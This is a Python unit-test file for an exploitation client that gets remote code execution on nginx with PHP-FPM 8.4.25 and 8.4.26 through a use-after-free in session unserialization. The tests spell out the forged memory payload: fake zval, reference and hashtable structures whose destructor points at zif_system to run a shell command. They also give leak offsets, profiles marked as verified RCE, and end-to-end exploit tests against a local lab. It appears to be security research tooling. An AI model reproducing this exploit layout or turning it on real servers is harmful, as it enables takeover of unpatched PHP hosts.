#!/usr/bin/env python3
"""Unit tests for the nginx + PHP-FPM exploitation client (tools/php2shell_fpm.py).

The unit tests need no laboratory.  The integration tests at the bottom
need the local FPM lab (lab/fpm, ``tools/php2shell_fpm_labs.py up``) and
run only when PHP2SHELL_FPM_LAB=1 is set.
"""

from __future__ import annotations

import json
import os
import struct
import sys
import unittest
from pathlib import Path
from types import SimpleNamespace
from unittest import mock

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "tools"))

import php2shell_fpm as fpm  # noqa: E402

D = 0x7F07BE280000      # lab-observed stale struct address
K = 0xFE8               # lab-observed reclaim content offset
SIZE = 12288
ZIF = 0x556C90186660    # lab-observed zif_system absolute address
CMD = b"id>out/p1"


class MultipartTests(unittest.TestCase):
    def test_build_multipart_shape(self):
        parts = [
            {"name": "pad0", "data": b"C" * 16},
            {"name": "f", "filename": "a.txt", "data": b"x" * 4},
        ]
        body = fpm.build_multipart(parts, b"BOUND1")
        self.assertTrue(body.startswith(b"--BOUND1\r\n"))
        self.assertIn(b'name="pad0"', body)
        self.assertIn(b'filename="a.txt"', body)
        self.assertIn(b"Content-Type: application/octet-stream", body)
        self.assertTrue(body.endswith(b"--BOUND1--\r\n"))


class LeakTests(unittest.TestCase):
    def test_dechunk(self):
        self.assertEqual(fpm._dechunk(b"4\r\nABCD\r\n0\r\n\r\n"), b"ABCD")
        self.assertEqual(fpm._dechunk(b"plain"), b"plain")

    def test_leak_geometry(self):
        g = fpm._leak_geometry("8.4.26")
        self.assertIsNotNone(g)
        self.assertEqual(g["pads"], [32768, 16384])
        self.assertEqual(g["read_len"], 0x15810)
        self.assertEqual(g["chunk_ptr_off"], 0x77F8)
        self.assertEqual(g["pie_ptr_off"], 0x157E8)

    def test_leak_geometry_8425_pie_offset(self):
        g = fpm._leak_geometry("8.4.25")
        self.assertIsNotNone(g)
        self.assertEqual(g["pie_base_off"], 0x4E9FC7)
        self.assertEqual(g["pads"], [32768, 16384])


class NoOracleRemoteModeTests(unittest.TestCase):
    """--no-oracle must not silently read local /proc when remote."""

    def _args(self, **extra):
        base = dict(
            base="http://127.0.0.1:1",
            builder="http://127.0.0.1:2",
            version="8.4.26",
            chunk=0,
            pie=0,
            allow_local_fallback=False,
        )
        base.update(extra)
        return SimpleNamespace(**base)

    def test_http_leak_failure_does_not_use_local_fallback(self):
        with mock.patch.object(fpm, "leak_bases_http",
                               side_effect=RuntimeError("offline")), \
             mock.patch.object(fpm, "_local_bases") as local:
            self.assertEqual(fpm.cmd_no_oracle(self._args()), 1)
            local.assert_not_called()

    def test_local_fallback_requires_explicit_opt_in(self):
        with mock.patch.object(fpm, "leak_bases_http",
                               side_effect=RuntimeError("offline")), \
             mock.patch.object(fpm, "_local_bases",
                               side_effect=RuntimeError("no lab")) as local:
            self.assertEqual(
                fpm.cmd_no_oracle(self._args(allow_local_fallback=True)), 1)
            local.assert_called_once_with("8.4.26")


class EndgamePayloadTests(unittest.TestCase):
    """The forged buffer must encode the exact dtor-chain layout the
    8.4.26 source expects (var_unserializer.re, session.c, zend_hash.c)."""

    @classmethod
    def setUpClass(cls):
        cls.buf = fpm._build_endgame_payload(D, K, SIZE, ZIF, CMD)

    def _off(self, addr: int) -> int:
        return K + (addr - D)

    def _u64(self, addr: int) -> int:
        return struct.unpack_from("<Q", self.buf, self._off(addr))[0]

    def _u32(self, addr: int) -> int:
        return struct.unpack_from("<I", self.buf, self._off(addr))[0]

    def _i64(self, addr: int) -> int:
        return struct.unpack_from("<q", self.buf, self._off(addr))[0]

    def test_fits_reclaim_buffer(self):
        self.assertLessEqual(K + 0x900, SIZE)

    def test_decode_struct(self):
        # last points at the embedded entries; used_slots=2 pushes new
        # values to data[2..] leaving data[1] for R:2 (var_access(1))
        self.assertEqual(self._u64(D + 0), D + 56)
        self.assertEqual(self._u64(D + 8), D + 0x400)
        self.assertEqual(self._u64(D + 16), D + 0x400)
        self.assertEqual(self._i64(D + 48), 64)
        self.assertEqual(self._i64(D + 56), 2)
        self.assertEqual(self._u64(D + 80), D + 0x300)
        self.assertEqual(self._i64(D + 0x400), 0)

    def test_fake_zval_is_reference(self):
        self.assertEqual(self._u64(D + 0x300), D + 0x500)
        self.assertEqual(self._u32(D + 0x308), 0x10A)  # IS_REFERENCE_EX

    def test_fake_reference(self):
        self.assertEqual(self._u32(D + 0x500), 0)      # rc forged 0
        self.assertEqual(self._u32(D + 0x504), 10)     # IS_REFERENCE
        self.assertEqual(self._u64(D + 0x508), D + 0x700)
        self.assertEqual(self._u32(D + 0x510), 0x307)  # IS_ARRAY_EX
        self.assertEqual(self._u64(D + 0x518), 0)      # sources = NULL

    def test_fake_hashtable(self):
        self.assertEqual(self._u32(D + 0x700), 1)      # rc 1
        self.assertEqual(self._u32(D + 0x704), 7)      # IS_ARRAY
        self.assertEqual(self._u32(D + 0x708), 0x10)   # HASH_FLAG_STATIC_KEYS
        self.assertEqual(self._u32(D + 0x70C), 0xFFFFFFF8)
        self.assertEqual(self._u64(D + 0x710), D + 0x800)
        self.assertEqual(self._u32(D + 0x718), 1)      # nNumUsed
        self.assertEqual(self._u32(D + 0x71C), 1)      # nNumOfElements
        self.assertEqual(self._u32(D + 0x720), 8)      # nTableSize
        self.assertEqual(self._u64(D + 0x730), ZIF)    # pDestructor

    def test_execute_frame(self):
        # the bucket at E doubles as the zif_system execute_data frame
        self.assertEqual(self._u64(D + 0x800), D + 0x880)  # val.str / opline
        self.assertEqual(self._u32(D + 0x808), 6)          # IS_STRING (non-UNDEF)
        self.assertEqual(self._u64(D + 0x810), D + 0x8F0)  # return_value scratch
        self.assertEqual(struct.unpack_from("<H", self.buf, self._off(D + 0x82C))[0], 1)
        self.assertEqual(self._u64(D + 0x850), D + 0x880)  # arg1.str
        self.assertEqual(self._u32(D + 0x858), 0x106)      # arg1 IS_STRING_EX

    def test_fake_zend_string(self):
        self.assertEqual(self._u32(D + 0x880), 1)          # gc.refcount
        self.assertEqual(self._u32(D + 0x884), 6)          # IS_STRING
        self.assertEqual(self._u64(D + 0x890), len(CMD))
        val = self.buf[self._off(D + 0x898):self._off(D + 0x898) + len(CMD)]
        self.assertEqual(val, CMD)
        self.assertEqual(self.buf[self._off(D + 0x898) + len(CMD)], 0)


class OracleChunkTests(unittest.TestCase):
    def test_chunk_base_handles_merged_anonymous_mapping(self):
        oracle = object.__new__(fpm.Oracle)
        oracle.maps = [(0x7F0000000000, 0x7F0000230000, "rw-p")]
        self.assertEqual(oracle.chunk_base(0x7F0000081000), 0x7F0000000000)


class ProfileConsistencyTests(unittest.TestCase):
    def _profile(self, version: str = "8.4.26") -> dict:
        return json.loads((ROOT / "profiles" / f"{version}-fpm.json").read_text())

    def test_fpm_profile_matches_module_constants(self):
        meta = self._profile()["fpm"]
        self.assertEqual(meta["bg_unserialize_data_off"],
                         fpm.BG_UNSERIALIZE_DATA_OFF)
        self.assertEqual(meta["bg_unserialize_level_off"],
                         fpm.BG_UNSERIALIZE_LEVEL_OFF)
        self.assertEqual(meta["struct_size"], 8216)
        self.assertEqual(meta["reclaim_size"], SIZE)
        self.assertEqual(meta["reclaim_pads"], [4096, 4096, 4096])

    def test_fpm_profile_is_rce_verified(self):
        profile = self._profile()
        self.assertEqual(profile["sapi"], "fpm")
        self.assertTrue(profile["rce"])
        self.assertTrue(profile["verified"])
        self.assertEqual(profile["fixed_in"], "8.4.27")
        self.assertEqual(profile["libphp"]["zif_system"], "0x386660")

    def test_fpm_8425_profile_is_rce_verified(self):
        profile = self._profile("8.4.25")
        self.assertTrue(profile["rce"])
        self.assertTrue(profile["verified"])
        self.assertEqual(profile["fixed_in"], "8.4.27")
        self.assertEqual(profile["libphp"]["zif_system"], "0x386460")
        self.assertEqual(profile["fpm"]["reclaim_pads"], [4096, 4096])
        self.assertEqual(profile["fpm"]["no_oracle"]["candidates"],
                         [{"d_off": "0x7f000", "k": "0xfe8"}])

    def test_fpm_profile_validates_against_schema(self):
        try:
            import jsonschema
        except ImportError:
            self.skipTest("jsonschema not installed")
        schema = json.loads((ROOT / "profiles" / "schema.json").read_text())
        for version in ("8.4.25", "8.4.26"):
            with self.subTest(version=version):
                jsonschema.validate(self._profile(version), schema)


LAB = os.environ.get("PHP2SHELL_FPM_LAB") == "1"


@unittest.skipUnless(LAB, "set PHP2SHELL_FPM_LAB=1 with the FPM lab up")
class FpmLabIntegrationTests(unittest.TestCase):
    """End-to-end primitive and RCE against the local 8.4.26 lab."""

    def _args(self, **extra):
        base = dict(
            base="http://127.0.0.1:8110",
            builder="http://127.0.0.1:8111",
            version="8.4.26",
            size=4 << 20,
            value=1337337,
            command="id>out/p1lab",
            proof_file="out/p1lab",
        )
        base.update(extra)
        return SimpleNamespace(**base)

    def test_primitive_observable(self):
        self.assertEqual(fpm.cmd_primitive(self._args()), 0)

    def test_endgame_rce_proof(self):
        self.assertEqual(fpm.cmd_endgame(self._args()), 0)

    def test_no_oracle_rce_proof(self):
        self.assertEqual(fpm.cmd_no_oracle(self._args()), 0)


if __name__ == "__main__":
    unittest.main()
